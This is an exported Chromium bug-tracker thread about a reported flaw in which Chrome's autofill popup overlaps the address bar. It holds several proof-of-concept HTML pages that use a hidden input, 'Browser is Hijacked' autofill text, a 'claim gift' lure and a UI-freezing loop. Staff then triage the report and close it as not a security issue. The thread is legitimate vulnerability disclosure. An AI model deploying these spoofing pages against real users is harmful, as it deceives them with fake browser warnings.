@@ -1,0 +1,388 @@
+Issue ID: 325071264
+
+Author: bu...@google.com
+comment 9 - <a href="https://www.google.com/url?q=https://issues.chromium.org/issues/325071264%23comment9&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3M2L_SfoQt4xcYf1bhH0Tc" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://issues.chromium.org/issues/325071264#comment9" data-b-redirected-href="https://www.google.com/url?q=https://issues.chromium.org/issues/325071264%23comment9&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3M2L_SfoQt4xcYf1bhH0Tc">https://issues.chromium.org/issues/325071264#comment9</a><br><br>The above comment has poc image for omnibox spoofing in chrome and full title bar spoofing in desktop webapp.<br><br>I created a new poc - <a href="https://www.google.com/url?q=https://bronzed-panoramic-change.glitch.me/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0fhdlZdlpUlkYBOe0UNeC3" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://bronzed-panoramic-change.glitch.me/" data-b-redirected-href="https://www.google.com/url?q=https://bronzed-panoramic-change.glitch.me/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0fhdlZdlpUlkYBOe0UNeC3">https://bronzed-panoramic-change.glitch.me/</a> , where I am able to cause a freeze in UI renderer intentionally so that autofill popup covers the omnibox for sometime without vanishing making it appear like actual message from OS/Browser.<br><br>```<br>&lt;html onclick=&quot;hangUI(event)&quot;&gt;<br>&lt;head&gt;<br>&lt;title&gt;Autofill Spoof UI&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form id=&quot;myForm&quot; action=&quot;#&quot; method=&quot;get&quot; autocomplete=&quot;on&quot; autofocus=on&gt;<br>  &lt;input type=&quot;text&quot; id=&quot;fname&quot; name=&quot;somerandstr1235&quot; style=&quot;height:17px;width:25px;margin-top:-20px;margin-left:7%;writing-mode: vertical-rl;opacity:0;&quot; autofocus=on&gt;<br>&lt;/form&gt;<br>&lt;/br&gt;<br>&lt;center id=&quot;p&quot;&gt;&lt;/p&gt;<br>&lt;script&gt;<br>  var keyPressIndex = parseInt(localStorage.getItem(&#39;keyPressIndex&#39;)) || 0;<br>  var clickCount = 0;<br>  var values = [&#39;                    ⚠️ ALERT ⚠️                    &#39;,&#39;                          Your                          &#39;,&#39;                        Browser                        &#39;,&#39;                      is Hijacked !                      &#39;,&#39;​&#39;];<br>  document.addEventListener(&#39;keydown&#39;, function(event) {<br>    if (event.key === &#39;ArrowDown&#39; &amp;&amp; keyPressIndex &lt; values.length) {<br>      autofillAndSubmit(keyPressIndex);<br>      keyPressIndex++;<br>      localStorage.setItem(&#39;keyPressIndex&#39;, keyPressIndex);<br>    }<br>        else {<br>        localStorage.setItem(&#39;keyPressIndex&#39;, 0);<br>        if(event.key === &#39;ArrowDown&#39;){<br>        document.getElementById(&#39;fname&#39;).focus();<br>        var delayInMilliseconds = 50; <br>        setTimeout(function() {<br>        document.getElementById(&#39;fname&#39;).click();<br>        }, delayInMilliseconds);<br>        }<br>        }<br>  });<br>   function autofillAndSubmit(index) {<br>    document.getElementById(&#39;fname&#39;).value = values[index];<br>    document.getElementById(&#39;myForm&#39;).submit();<br>    }<br>        function hangUI(event) {<br>        event.preventDefault();<br>        event.stopPropagation();<br>        if(clickCount==0){<br>        for(i=0;i&lt;190000;i++){<br>        console.log(&quot;Hi&quot;);<br>        }<br>        clickCount=1;<br>        }<br>    }<br><br>  document.getElementById(&quot;p&quot;).innerHTML = &quot;Press Down Key &quot; + (values.length + 1) + &quot; times to claim gift !&quot;;<br>&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br>```
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>Autofill UI overlaps Browser Renderer UI (Resurfaced Again, more serious in desktop web apps)</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Which product or website have you found a vulnerability in?</h4>
+<p>Google Chrome</p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<p>For security reasons HTML Content UI shouldn&#39;t overlap Browser&#39;s Renderer UI at all.
+I have already seen few reports where these were fixed, this seems to have resurfaced again, this is more vulnerable in desktop web apps, where this covers most of the URL bar in certain circumstances.
+Tested in Edge browser which works fine.</p>
+<p><strong>Steps to reproduce</strong></p>
+<ol>
+<li>Open s.html in chrome browser (windows 64 bit)</li>
+<li>Click down arrow on keyboard, you can see autofill overlapping the address bar.</li>
+<li>This is more crucial in Desktop Web Apps, where most of the URL is covered</li>
+</ol>
+<p><strong>Reference</strong>:
+<a href="https://textslashplain.com/2017/01/14/the-line-of-death/" data-b-widget="url" data-b-original-href="https://textslashplain.com/2017/01/14/the-line-of-death/" data-b-redirected-href="https://www.google.com/url?q=https://textslashplain.com/2017/01/14/the-line-of-death/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3HqnQdOsemlHjhsDaBGScC">https://textslashplain.com/2017/01/14/the-line-of-death/</a>
+<a href="https://issues.chromium.org/issues/40056753" data-b-widget="issue-reference" data-b-issue-id="40056753">https://issues.chromium.org/issues/40056753</a>
+<a href="https://issues.chromium.org/issues/40054626" data-b-widget="issue-reference" data-b-issue-id="40054626">https://issues.chromium.org/issues/40054626</a></p>
+<h4>Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<p>Attacker can spoof browser ui.</p>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>Version 121.0.6167.161 (Official Build) (64-bit) [Windows]</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>No</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Security UI Spoofing</p>
+<h4>How would you like to be publicly acknowledged for your report?</h4>
+<p>Jayateertha Guruprasad</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: ja...@gmail.com
+Autofill UI overlaps Browser Renderer UI (Resurfaced Again, more serious in desktop web apps)
+
+Author: ja...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ja...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+google_domain
+
+Author: ja...@gmail.com
+Please Find the attached screenshots as part of POC.<br><br>1. Edge.png shows edge is not vulnerable<br>2. WebApp UI.png shows actual UI of a desktop web app like google finance, when installed through chrome &amp; navigated to some other website from the app.<br>3. WebApp UI Spoof.png shows domain name hidden in omniboxx<br>4. UI Spoof.png shows omnibox partially covered by autofill dialog in normal chrome browser<br><br>Impact might be higher where url is either short or contains unicode characters.
+
+Author: ja...@gmail.com
+TXpJMU1EY3hNalkwTFRVek5qQXhPREUzTFMwMU56azBPREF5T1RNPQ==
+
+Author: ja...@gmail.com
+TXpJMU1EY3hNalkwTFRVek5qQXdPVFV5TFRRM05qWXlORFl3
+
+Author: ja...@gmail.com
+TXpJMU1EY3hNalkwTFRVek5qRXpPRFk1TFRFMk1qQTJNekV6TVRnPQ==
+
+Author: ja...@gmail.com
+TXpJMU1EY3hNalkwTFRVek5qQXhPREU0TFRZek1EQTNOakUwTkE9PQ==
+
+Author: el...@chromium.org
+<p>Hi! Thanks for the report. How does one actually cause autofill to trigger in this kind of situation? And can an attacker cause the autofill to be populated with fake data like in your screenshots? It&#39;s not fully clear to me what the scope and danger of this is.</p>
+
+Author: el...@chromium.org
+public_non_google
+
+Author: ja...@gmail.com
+Hi ,<br><br>In my poc autofill is triggered by pressing down arrow key on keyboard.<br><br>Autofill was not populated automatically with fake data as of now, this was manual full data.<br><br>Need to check if this can be auto populated.
+
+Author: ja...@gmail.com
+Hi team,<br><br>I think filling the autofill popup by attacker is also possible, will try to give the full poc by a day.<br><br>So Impact is - <br>1. Attacker can fill autofill data.<br>2. Attacker can make the input type hidden by setting opacity to 0.<br>3. Victim visits attacker website, presses down arrow key, autofill ui overlaps part of omnibox(including url), incase of desktop webapp covers full title bar.
+
+Author: el...@chromium.org
+<p>Great, thank you - please do, since that significantly affects the impact, imo.</p>
+
+Author: el...@chromium.org
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ja...@gmail.com
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Autofill Spoof UI&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form id=&quot;myForm&quot; action=&quot;#&quot; method=&quot;get&quot; autocomplete=&quot;on&quot; autofocus=on&gt;
+  &lt;input type=&quot;text&quot; id=&quot;fname&quot; name=&quot;somerandstr123&quot; style=&quot;height:17px;width:25px;margin-top:-20px;margin-left:7%;opacity:0;&quot; autofocus=on&gt;
+&lt;/form&gt;
+&lt;/br&gt;
+&lt;center id=&quot;p&quot;&gt;&lt;/p&gt;
+&lt;script&gt;
+  var keyPressIndex = parseInt(localStorage.getItem(&#39;keyPressIndex&#39;)) || 0;
+  var values = [&#39;                    ⚠️ ALERT ⚠️                    &#39;,&#39;                          Your                          &#39;,&#39;                        Browser                        &#39;,&#39;                      is Hijacked !                      &#39;,&#39;​&#39;];
+  document.addEventListener(&#39;keydown&#39;, function(event) {
+    if (event.key === &#39;ArrowDown&#39; &amp;&amp; keyPressIndex &lt; values.length) {
+      autofillAndSubmit(keyPressIndex);
+      keyPressIndex++;
+      localStorage.setItem(&#39;keyPressIndex&#39;, keyPressIndex);
+    }
+	else{
+	localStorage.setItem(&#39;keyPressIndex&#39;, 0);
+	}
+  });
+   function autofillAndSubmit(index) {
+    document.getElementById(&#39;fname&#39;).value = values[index];
+    document.getElementById(&#39;myForm&#39;).submit();
+    }
+  document.getElementById(&quot;p&quot;).innerHTML = &quot;Press Down Key &quot; + (values.length + 1) + &quot; times to claim gift !&quot;;
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+<p><strong>Use this POC to autofill the form and show autofill UI on top of omnibox with attacker controlled characters</strong></p>
+
+Author: ja...@gmail.com
+TXpJMU1EY3hNalkwTFRVek5qVXpNRFUxTFMweE1qSXdOVFF3T0RZeA==
+
+Author: ja...@gmail.com
+TXpJMU1EY3hNalkwTFRVek5qWXdNVEk1TFRFME1UQXpOREExTURNPQ==
+
+Author: pe...@google.com
+Thank you for providing more feedback. Adding the requester to the CC list.
+
+Author: el...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ja...@gmail.com
+<p>Hi team,</p>
+<p>You can also visit this POC, where I have caused delay to UI renderer intentionally to not allow autofill pop up to disappear for sometime making it look like real dialog from OS/browser hiding the omnibox (urlbar partially) in chrome browser &amp; hiding title bar completely in desktop web app.</p>
+<p>This may allow few characters to be spoofed partially in url bar also.</p>
+<p>POC URL - <a href="https://bronzed-panoramic-change.glitch.me/" data-b-widget="url" data-b-original-href="https://bronzed-panoramic-change.glitch.me/" data-b-redirected-href="https://www.google.com/url?q=https://bronzed-panoramic-change.glitch.me/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0fhdlZdlpUlkYBOe0UNeC3">https://bronzed-panoramic-change.glitch.me/</a></p>
+<pre><code>&lt;html onclick=&quot;hangUI(event)&quot;&gt;
+&lt;head&gt;
+&lt;title&gt;Autofill Spoof UI&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form id=&quot;myForm&quot; action=&quot;#&quot; method=&quot;get&quot; autocomplete=&quot;on&quot; autofocus=on&gt;
+  &lt;input type=&quot;text&quot; id=&quot;fname&quot; name=&quot;somerandstr1235&quot; style=&quot;height:17px;width:25px;margin-top:-20px;margin-left:7%;writing-mode: vertical-rl;opacity:0;&quot; autofocus=on&gt;
+&lt;/form&gt;
+&lt;/br&gt;
+&lt;center id=&quot;p&quot;&gt;&lt;/p&gt;
+&lt;script&gt;
+  var keyPressIndex = parseInt(localStorage.getItem(&#39;keyPressIndex&#39;)) || 0;
+  var clickCount = 0;
+  var values = [&#39;                    ⚠️ ALERT ⚠️                    &#39;,&#39;                          Your                          &#39;,&#39;                        Browser                        &#39;,&#39;                      is Hijacked !                      &#39;,&#39;​&#39;];
+  document.addEventListener(&#39;keydown&#39;, function(event) {
+    if (event.key === &#39;ArrowDown&#39; &amp;&amp; keyPressIndex &lt; values.length) {
+      autofillAndSubmit(keyPressIndex);
+      keyPressIndex++;
+      localStorage.setItem(&#39;keyPressIndex&#39;, keyPressIndex);
+    }
+	else {
+	localStorage.setItem(&#39;keyPressIndex&#39;, 0);
+	if(event.key === &#39;ArrowDown&#39;){
+	document.getElementById(&#39;fname&#39;).focus();
+	var delayInMilliseconds = 50; 
+	setTimeout(function() {
+	document.getElementById(&#39;fname&#39;).click();
+	}, delayInMilliseconds);
+	}
+	}
+  });
+   function autofillAndSubmit(index) {
+    document.getElementById(&#39;fname&#39;).value = values[index];
+    document.getElementById(&#39;myForm&#39;).submit();
+    }
+	function hangUI(event) {
+	event.preventDefault();
+	event.stopPropagation();
+	if(clickCount==0){
+	for(i=0;i&lt;190000;i++){
+	console.log(&quot;Hi&quot;);
+	}
+	clickCount=1;
+	}
+    }
+
+  document.getElementById(&quot;p&quot;).innerHTML = &quot;Press Down Key &quot; + (values.length + 1) + &quot; times to claim gift !&quot;;
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+
+Author: ja...@gmail.com
+TXpJMU1EY3hNalkwTFRVek5qVXpNRFUzTFRnME1qTXdOVGcw
+
+Author: ja...@gmail.com
+TXpJMU1EY3hNalkwTFRVek5qWXdNVE0wTFMweE1qWTVOVFk0TXpZNA==
+
+Author: ja...@gmail.com
+<p>comment 9 - <a href="https://issues.chromium.org/issues/325071264#comment9" data-b-widget="issue-reference" data-b-issue-id="325071264" data-b-comment-number="9">https://issues.chromium.org/issues/325071264#comment9</a></p>
+<p>The above comment has poc image for omnibox spoofing in chrome and full title bar spoofing in desktop webapp.</p>
+<p>I created a new poc, where I am able to cause a freeze in UI renderer intentionally so that autofill popup covers the omnibox for sometime without vanishing making it appear like actual message from OS/Browser.</p>
+<pre><code>&lt;html onclick=&quot;hangUI(event)&quot;&gt;
+&lt;head&gt;
+&lt;title&gt;Autofill Spoof UI&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form id=&quot;myForm&quot; action=&quot;#&quot; method=&quot;get&quot; autocomplete=&quot;on&quot; autofocus=on&gt;
+  &lt;input type=&quot;text&quot; id=&quot;fname&quot; name=&quot;somerandstr1235&quot; style=&quot;height:17px;width:25px;margin-top:-20px;margin-left:7%;writing-mode: vertical-rl;opacity:0;&quot; autofocus=on&gt;
+&lt;/form&gt;
+&lt;/br&gt;
+&lt;center id=&quot;p&quot;&gt;&lt;/p&gt;
+&lt;script&gt;
+  var keyPressIndex = parseInt(localStorage.getItem(&#39;keyPressIndex&#39;)) || 0;
+  var clickCount = 0;
+  var values = [&#39;                    ⚠️ ALERT ⚠️                    &#39;,&#39;                          Your                          &#39;,&#39;                        Browser                        &#39;,&#39;                      is Hijacked !                      &#39;,&#39;​&#39;];
+  document.addEventListener(&#39;keydown&#39;, function(event) {
+    if (event.key === &#39;ArrowDown&#39; &amp;&amp; keyPressIndex &lt; values.length) {
+      autofillAndSubmit(keyPressIndex);
+      keyPressIndex++;
+      localStorage.setItem(&#39;keyPressIndex&#39;, keyPressIndex);
+    }
+	else {
+	localStorage.setItem(&#39;keyPressIndex&#39;, 0);
+	if(event.key === &#39;ArrowDown&#39;){
+	document.getElementById(&#39;fname&#39;).focus();
+	var delayInMilliseconds = 50; 
+	setTimeout(function() {
+	document.getElementById(&#39;fname&#39;).click();
+	}, delayInMilliseconds);
+	}
+	}
+  });
+   function autofillAndSubmit(index) {
+    document.getElementById(&#39;fname&#39;).value = values[index];
+    document.getElementById(&#39;myForm&#39;).submit();
+    }
+	function hangUI(event) {
+	event.preventDefault();
+	event.stopPropagation();
+	if(clickCount==0){
+	for(i=0;i&lt;190000;i++){
+	console.log(&quot;Hi&quot;);
+	}
+	clickCount=1;
+	}
+    }
+
+  document.getElementById(&quot;p&quot;).innerHTML = &quot;Press Down Key &quot; + (values.length + 1) + &quot; times to claim gift !&quot;;
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+
+Author: ja...@gmail.com
+comment 9 - <a href="https://www.google.com/url?q=https://issues.chromium.org/issues/325071264%23comment9&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3M2L_SfoQt4xcYf1bhH0Tc" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://issues.chromium.org/issues/325071264#comment9" data-b-redirected-href="https://www.google.com/url?q=https://issues.chromium.org/issues/325071264%23comment9&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3M2L_SfoQt4xcYf1bhH0Tc">https://issues.chromium.org/issues/325071264#comment9</a><br><br>The above comment has poc image for omnibox spoofing in chrome and full title bar spoofing in desktop webapp.<br><br>I created a new poc - <a href="https://www.google.com/url?q=https://bronzed-panoramic-change.glitch.me/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0fhdlZdlpUlkYBOe0UNeC3" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://bronzed-panoramic-change.glitch.me/" data-b-redirected-href="https://www.google.com/url?q=https://bronzed-panoramic-change.glitch.me/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0fhdlZdlpUlkYBOe0UNeC3">https://bronzed-panoramic-change.glitch.me/</a> , where I am able to cause a freeze in UI renderer intentionally so that autofill popup covers the omnibox for sometime without vanishing making it appear like actual message from OS/Browser.<br><br>```<br>&lt;html onclick=&quot;hangUI(event)&quot;&gt;<br>&lt;head&gt;<br>&lt;title&gt;Autofill Spoof UI&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form id=&quot;myForm&quot; action=&quot;#&quot; method=&quot;get&quot; autocomplete=&quot;on&quot; autofocus=on&gt;<br>  &lt;input type=&quot;text&quot; id=&quot;fname&quot; name=&quot;somerandstr1235&quot; style=&quot;height:17px;width:25px;margin-top:-20px;margin-left:7%;writing-mode: vertical-rl;opacity:0;&quot; autofocus=on&gt;<br>&lt;/form&gt;<br>&lt;/br&gt;<br>&lt;center id=&quot;p&quot;&gt;&lt;/p&gt;<br>&lt;script&gt;<br>  var keyPressIndex = parseInt(localStorage.getItem(&#39;keyPressIndex&#39;)) || 0;<br>  var clickCount = 0;<br>  var values = [&#39;                    ⚠️ ALERT ⚠️                    &#39;,&#39;                          Your                          &#39;,&#39;                        Browser                        &#39;,&#39;                      is Hijacked !                      &#39;,&#39;​&#39;];<br>  document.addEventListener(&#39;keydown&#39;, function(event) {<br>    if (event.key === &#39;ArrowDown&#39; &amp;&amp; keyPressIndex &lt; values.length) {<br>      autofillAndSubmit(keyPressIndex);<br>      keyPressIndex++;<br>      localStorage.setItem(&#39;keyPressIndex&#39;, keyPressIndex);<br>    }<br>        else {<br>        localStorage.setItem(&#39;keyPressIndex&#39;, 0);<br>        if(event.key === &#39;ArrowDown&#39;){<br>        document.getElementById(&#39;fname&#39;).focus();<br>        var delayInMilliseconds = 50; <br>        setTimeout(function() {<br>        document.getElementById(&#39;fname&#39;).click();<br>        }, delayInMilliseconds);<br>        }<br>        }<br>  });<br>   function autofillAndSubmit(index) {<br>    document.getElementById(&#39;fname&#39;).value = values[index];<br>    document.getElementById(&#39;myForm&#39;).submit();<br>    }<br>        function hangUI(event) {<br>        event.preventDefault();<br>        event.stopPropagation();<br>        if(clickCount==0){<br>        for(i=0;i&lt;190000;i++){<br>        console.log(&quot;Hi&quot;);<br>        }<br>        clickCount=1;<br>        }<br>    }<br><br>  document.getElementById(&quot;p&quot;).innerHTML = &quot;Press Down Key &quot; + (values.length + 1) + &quot; times to claim gift !&quot;;<br>&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br>```
+
+Author: ja...@gmail.com
+Hi team,<br><br>is there any issue here, I am not able to reply, few of my comments are getting deleted.<br><br>So read my comments in this attachment.
+
+Author: ja...@gmail.com
+TXpJMU1EY3hNalkwTFRVek5qWXdNVE0xTFRJeU9EWTBOams0TXc9PQ==
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: el...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: el...@chromium.org
+<p>Thanks, that&#39;s useful. Routing to the Autofill team and provisionally setting severity :)</p>
+
+Author: pe...@google.com
+Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won&#39;t make this change again.
+
+Author: am...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: am...@chromium.org
+public_non_google
+
+Author: jk...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: jk...@google.com
+googlers_unrestricted
+
+Author: ma...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ma...@chromium.org
+public_non_google
+
+Author: sc...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: sc...@google.com
+googlers_unrestricted
+
+Author: am...@chromium.org
+<p>adding Autofill owners so that they have access to / can review this issue :)</p>
+
+Author: am...@chromium.org
+type.googleapis.com/google.protobuf.StringValue
+
+Author: am...@chromium.org
+<p>Also setting tentative foundin-122 since 122 is current Stable and Extended Stable; if this regressed more recently, please feel free to update</p>
+
+Author: jk...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: jk...@google.com
+WlRFME9URTVNamc0WkdGbE16RTJNV0V5TWpRNE5ESTVOMkZoWW1FeE9URT0=
+
+Author: I don't think I understand the threat potential yet: This does not extract user data and it only partially overlaps with the Omnibox - it does not obscure it.
+
+What would be the scenario in which you'd extract user data by doing this?
+
+@schwering, @mamir, would you mind also taking a look at this?
+WlRFME9URTVNamc0WkdGbE16RTJNV0V5TWpRNE5ESTVOMkZoWW1FeE9URT0=
+
+Author: sc...@google.com
+<p>This looks OK to me since the overlaying popup is is clearly distinguishable from the omnibox.</p>
+
+Author: ja...@gmail.com
+Hi team,<br><br>Why I feel this is a issue - <br>1. User HTML content cannot cross boundary and interfere with the renderer UI (This is followed by all the browsers including Edge which is also a chromium fork)<br>The boundary is what describes where the message is from, is the message/pop up from a HTML content or from a OS/application(such as browser).<br>This can be used to spoof a pop up as if its originated from OS/Application.<br><br>Ref: <a href="https://www.google.com/url?q=https://textslashplain.com/2017/01/14/the-line-of-death/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3HqnQdOsemlHjhsDaBGScC" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://textslashplain.com/2017/01/14/the-line-of-death/" data-b-redirected-href="https://www.google.com/url?q=https://textslashplain.com/2017/01/14/the-line-of-death/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3HqnQdOsemlHjhsDaBGScC">https://textslashplain.com/2017/01/14/the-line-of-death/</a><br><br>2. It definitely hides some part of the url, which can be used to partially spoof url.(Although not a complete spoof it&#39;s definetely a issue, the drop-down location can also be adjusted left/right to obscure exact part of url partially)
+
+Author: jk...@google.com
+WmpJMllqVTFOekU0TnpFMFlqRm1PVGRoTlRVNE5UWXdZMk0xT0dJd01qWT0=
+
+Author: IMO this does not qualify as an issue. There was a recent discussion (prior to this bug report) with UX (involving the Autofill UX lead, dsholkov@) the decision was that this minimal overlap is okay - the omnibox is not obscured enough to truly cause an issue.
+
+Amy, I am assigning this back to you to verify that you concur. If you do, please feel free to close.
+WmpJMllqVTFOekU0TnpFMFlqRm1PVGRoTlRVNE5UWXdZMk0xT0dJd01qWT0=
+
+Author: am...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: am...@google.com
+google_domain
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: am...@chromium.org
+<p>We generally consider a bug that &quot;allows web content to tamper with trusted browser UI&quot; [1] to be considered medium severity.
+While this does tamper with the omnibox, it does so only partially and requires multiple clicks (6) from the user get to that point.
+I&#39;ve also repro&#39;ed this on Linux, Mac, and Windows and as far as I can tell the user can easy identify and exit the pop-up.
+I&#39;m not sure I agree that a convincing even partial spoof of the URL is possible here, so I&#39;m inclined to agree and close this issue.
+I&#39;ll leave it open for a bit in the interim in case the researcher can provide a more compelling POC.</p>
+<p>OP, if you can provide a more compelling POC or for any reports in the future, please link the html file of the POC directly in the report rather than linking it. Thank you.</p>
+<p>[1] <a href="https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md#toc-medium-severity" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md#toc-medium-severity" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/main/docs/security/severity-guidelines.md%23toc-medium-severity&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3nBfA2QFDvjnW2GHrBVJDo">https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md#toc-medium-severity</a></p>
+
+Author: ja...@gmail.com
+Hi team,<br><br>As per <br><a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/severity-guidelines.md" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/severity-guidelines.md" data-b-redirected-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/severity-guidelines.md">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/severity-guidelines.md</a> - A bug that allows web content to tamper with trusted browser UI (omnibox) is a vulnerability.<br><br>As per <a href="https://www.google.com/url?q=https://issues.chromium.org/issues/40054626%23comment15&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw18HzZ_yfI1T00LxyHhOSDF" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://issues.chromium.org/issues/40054626#comment15" data-b-redirected-href="https://www.google.com/url?q=https://issues.chromium.org/issues/40054626%23comment15&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw18HzZ_yfI1T00LxyHhOSDF">https://issues.chromium.org/issues/40054626#comment15</a> , In my POC the drop-down dialog is clearly crossing the browser&#39;s line of death which only specific os related elements can surpass like file selection ui.<br><br>Although for now, I cannot fully cover the omnibox, partial spoof is clearly possible. (As it&#39;s partial, I agree with low severity rather than not a security issue at all, I would be glad if chromium could fix it rather than 3rd party like Edge dependent on chromium fixing only for their browsers.)<br><br>I haven&#39;t tested the poc in android device attached to HID like keyboard, as I do not have the resources but will let you know if I can increase the severity of this issue later.<br><br>Thanks and Regards<br>Jayateertha Guruprasad
+
+Author: am...@chromium.org
+<p>Thanks for the response and for clarifying that you aren&#39;t able to overlap the omnibox more than what has been demonstrated.</p>
+<p>As mentioned in my <a href="https://issues.chromium.org/issues/325071264#comment22" data-b-widget="issue-reference" data-b-issue-id="325071264" data-b-comment-number="22">comment #22</a>, yes, we do generally consider web content that allows tampering with the security UI / ombibox to be a medium severity bug; however, the tampering and crossing of the line of death demonstrated here is a quite minimal from all angles and is not demonstrated in any way that looks that this could be leveraged to result in a reasonable or believable omnibox spoof, even a partial one, this not medium security as presented.</p>
+<p>This issue is even further mitigated due to the the number of user interactions to get to the state of even the minimal overlap presented this cannot be considered and treated as a security issue.</p>
+<p>But moreso, guidelines aside, this doesn&#39;t look to be in an issue that could reasonably or really at all be used to result in user harm or significant issues to a user. As such, I don&#39;t think this can be considered a security issue or even a bug as it does not appear there&#39;s anything for us to fix or change here.</p>
+<p>If at any point you are able to demonstrate or discover an avenue for a more problematic level of overlap or demonstrate this issue in a less mitigated fashion, please feel free to open a new report.</p>
+
+Author: am...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ja...@gmail.com
+Hi team,<br><br>In the attachment - <a href="https://www.google.com/url?q=https://issues.chromium.org/action/issues/325071264/attachments/53660129?download%3Dfalse&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3KZlCAQEUQ1Ncd_7gvABh1" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://issues.chromium.org/action/issues/325071264/attachments/53660129?download=false" data-b-redirected-href="https://www.google.com/url?q=https://issues.chromium.org/action/issues/325071264/attachments/53660129?download%3Dfalse&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3KZlCAQEUQ1Ncd_7gvABh1">https://issues.chromium.org/action/issues/325071264/attachments/53660129?download=false</a> <br><br>You can see extension is html, but letter can be btml also when spoofed might looked like html.<br><br>example - <a href="https://www.google.com/url?q=http://backerone.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3uQKDJTdCzG98YBgMW2iwy" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://backerone.com" data-b-redirected-href="https://www.google.com/url?q=http://backerone.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3uQKDJTdCzG98YBgMW2iwy">backerone.com</a> might look like <a href="https://www.google.com/url?q=http://hackerone.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UlI9tvrkn-4xouHDIz7fu" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://hackerone.com" data-b-redirected-href="https://www.google.com/url?q=http://hackerone.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UlI9tvrkn-4xouHDIz7fu">hackerone.com</a> when partially spoofed.<br><br>
+
+Author: pe...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: pe...@google.com
